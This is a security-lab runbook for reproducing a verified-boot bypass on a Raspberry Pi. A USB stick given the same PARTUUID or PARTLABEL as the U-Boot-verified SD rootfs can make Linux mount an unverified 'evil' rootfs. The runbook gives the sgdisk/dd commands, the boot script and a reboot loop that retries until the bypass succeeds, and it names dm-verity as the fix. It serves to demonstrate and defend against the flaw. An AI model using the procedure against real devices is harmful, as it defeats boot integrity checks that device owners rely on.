# Physical reproduction on a Raspberry Pi (SD good vs USB evil)

The QEMU lab is **deterministic**: on `-M virt`, both U-Boot and Linux enumerate the
virtio/USB transports in the same order, so the multi-disk divergence there is a
*policy* divergence (U-Boot trusts a fixed slot; Linux picks first-by-identifier), not a
genuine enumeration-order disagreement. The authentic #116 multi-disk case — where the
**firmware and the kernel number heterogeneous storage differently** — is a real-hardware
phenomenon. A Raspberry Pi with an **SD card (golden)** and a **USB stick (attacker)** is
the cleanest way to show it.

This runbook produces that demo and pairs with the lab's `REPEAT` harness, because the
USB-vs-SD enumeration race can be non-deterministic — reboot N times and catch the boot
where they diverge.

## Idea

* SD card holds the **golden** rootfs; the vendor U-Boot boots from SD and verifies the
  SD rootfs (by name / hash / signed FIT — same model as the lab).
* USB stick holds the **evil** rootfs, in a partition that carries the **same
  `PARTUUID`** (or the same `PARTLABEL=rootfs`) as the SD rootfs — the "duplicate
  PARTUUID on another drive connected to the same system" from the issue.
* U-Boot passes `root=PARTUUID=<X>` (or `PARTLABEL=rootfs`).
* Linux re-resolves it against **all** block devices. On the Pi, USB mass storage
  (`sda`) and the SD (`mmcblk0`) are probed by different subsystems with different
  timing, and U-Boot's `mmc`/`usb` numbering does not match Linux's `mmcblk*`/`sd*`.
  When Linux binds the identifier to the USB stick, it mounts the **evil** rootfs that
  U-Boot never verified.

## Hardware / software

* Raspberry Pi 4 or 5 (arm64), a microSD card, a USB flash drive.
* Serial console on the GPIO UART (GND/TXD/RXD, 115200 8N1) — you need to see U-Boot
  and the kernel log.
* Mainline **U-Boot** for the Pi (`rpi_4_defconfig` / `rpi_arm64_defconfig`) OR the Pi
  firmware chainloading U-Boot. The stock Pi firmware alone won't show the U-Boot side;
  use U-Boot so the "verify then hand `root=` to Linux" flow matches the lab.
* An arm64 kernel with a **Pi** DTB (`bcm2711-rpi-4-b.dtb`). The lab's `out/kernel/Image`
  is a generic arm64 kernel; for the Pi build with `bcm2711_defconfig` (or use Raspberry
  Pi OS's kernel) — the confusion is independent of the kernel build.

You can **reuse the lab's rootfs images** (`out/rootfs/good.img`, `out/rootfs/evil.img`)
verbatim — they are plain arm64 busybox ext4 images whose init prints the GOOD/EVIL
banner, exactly what you want to see on the serial console.

## Steps

### 1. SD card — golden

Partition the SD (GPT) and write the golden rootfs, tagging it with the shared id:

```sh
sudo sgdisk -Z /dev/mmcblk0
sudo sgdisk -n 1:0:+256M -t 1:0c00 -c 1:bootfs \        # Pi boot (firmware + U-Boot + kernel)
            -n 2:0:+2G   -t 2:8300 -c 2:rootfs \        # PARTLABEL = rootfs
            -u 2:11111111-2222-3333-4444-555555555555 \ # PARTUUID = X
            /dev/mmcblk0
sudo dd if=out/rootfs/good.img of=/dev/mmcblk0p2 bs=1M conv=fsync
# populate p1 with: Pi firmware (bootcode/start.elf/fixup), config.txt, u-boot.bin,
# the kernel Image, the bcm2711 DTB, and boot.scr.
```

### 2. USB stick — attacker

Give the USB stick a partition with the **same** `PARTUUID` (or the same
`PARTLABEL=rootfs`) and write the evil rootfs:

```sh
sudo sgdisk -Z /dev/sda
sudo sgdisk -n 1:0:+2G -t 1:8300 -c 1:rootfs \
            -u 1:11111111-2222-3333-4444-555555555555 \ # SAME PARTUUID as the SD rootfs
            /dev/sda
sudo dd if=out/rootfs/evil.img of=/dev/sda1 bs=1M conv=fsync
```

### 3. U-Boot boot script (`boot.scr` on the SD boot partition)

Model the vendor flow: verify the golden rootfs U-Boot trusts (the SD, `mmc 0`), then
hand Linux `root=PARTUUID=X`. Adapt `uboot/boot.cmd` from the lab:

```
mmc dev 0
# verify the golden rootfs on the SD (by name / hash / FIT) — see uboot/boot.cmd
load mmc 0:1 ${kernel_addr_r} Image
load mmc 0:1 ${fdt_addr_r} bcm2711-rpi-4-b.dtb
setenv bootargs "console=ttyAMA0,115200 root=PARTUUID=11111111-2222-3333-4444-555555555555 rootwait rw init=/sbin/init panic=-1"
booti ${kernel_addr_r} - ${fdt_addr_r}
```

`rootwait` is important — Linux must wait for USB mass storage to enumerate, which is
exactly when the race with the SD becomes observable.

### 4. Boot and observe

With **both** the SD and the USB stick inserted, power on and watch the serial log:

* U-Boot verifies the **SD** golden rootfs (`mmc 0`) and boots.
* Watch the kernel's `root=PARTUUID=` resolution and the `EXT4-fs (...): mounted
  filesystem <uuid>` line. Cross-check the fs UUID against the lab's
  `results/rootfs-uuids.txt` (or re-dump with `dumpe2fs -h`) to know whether `mmcblk0p2`
  (good) or `sda1` (evil) was mounted, and read the init banner (GOOD vs EVIL).

**Vulnerable outcome:** the banner is `*** ... EVIL ...` — Linux mounted the USB stick
that U-Boot never verified, while `root=` named the golden PARTUUID.

### 5. De-flake with repeat (the "if once, we win" method)

USB-vs-SD probe timing is a race, so the divergence may appear only on some boots.
Reboot the Pi in a loop and stop when the EVIL banner appears — the physical analogue of
the lab's `REPEAT`/`WANT` harness:

```sh
# from a controlling host capturing the Pi serial console to pi.log:
for i in $(seq 1 20); do
    power_cycle_pi          # your relay / usbrelay / manual reset
    capture_serial 60 >> pi.log
    grep -q 'MALICIOUS ROOTFS\|ROOTFS IDENTITY : EVIL' pi.log && { echo "diverged on boot $i"; break; }
done
```

A single divergent boot out of N proves the confusion is real on hardware — you do not
need it to happen every time.

## Notes / caveats

* If Linux consistently mounts the SD (never the USB), swap which medium is enumerated
  first, or try `PARTLABEL=rootfs` instead of `PARTUUID` — label matching walks devices
  in a different order and often surfaces the divergence more readily.
* The strongest mitigation still applies and is worth showing on the Pi too: put the
  rootfs behind **dm-verity** with the root hash in the signed boot artifacts (see
  `make verity`), and the USB/evil medium fails verification regardless of which device
  Linux binds.
* Keep the SD golden rootfs and the USB evil rootfs byte-identical to the lab's
  `good.img`/`evil.img` so the serial banners and fs-UUIDs line up with `results/`.
